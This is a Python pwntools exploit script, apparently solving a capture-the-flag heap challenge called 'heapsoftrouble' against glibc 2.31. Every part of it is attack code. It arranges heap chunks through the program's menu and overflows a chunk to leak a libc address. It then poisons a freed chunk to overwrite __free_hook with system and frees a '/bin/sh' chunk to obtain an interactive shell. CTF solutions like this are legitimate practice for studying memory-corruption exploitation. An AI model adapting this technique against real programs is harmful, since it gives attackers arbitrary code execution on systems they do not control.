from pwn import *
import time
elf = ELF("./heapsoftrouble")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
context.binary=elf
target=process([elf.path],env={"LD_PRELOAD":libc.path})
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def select(name):
	sla("Matrix: ",name)

def add(population,name):
	sla("Exit\n",str(1))
	sla("New Matrix: ",name)
	sla("transfer to new matrix: ",str(population))
	
def delete(name):
	sla("Exit\n",str(2))
	select(name)

def attack(payload):	
	sla("Exit\n",str(7))
	time.sleep(0.1)
	target.sendline(payload)
	
def leaks(name):
	sla("Exit\n",str(4))
	select(name)
	target.recvuntil("Matrix [")
	leak=target.recvuntil("]").strip("]")
	return leak

sla("Login: ","Arav")
for i in range(16):
	delete("Matrix #"+str(i))
add(0,"A")
add(0,"A"*0x420)
add(0,"B")
delete("A"*0x420)
add(0,"C")
delete("A")
payload="A"*0x40+"\x10"
attack(payload)
libc_base=u64(leaks("C")[8:])-0x1b9e30
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
print(hex(libc_base))
attack("A"*0x5)
payload="A"*0x20+p64(0)+p64(0x31)+p64(libc_free_hook-8)
attack(payload)
attack("A"*0x5)
payload="A"*5+"\x00"+"A"*2+p64(libc_system)+"A"*8
attack(payload)
delete("/bin/sh\x00")
target.interactive()
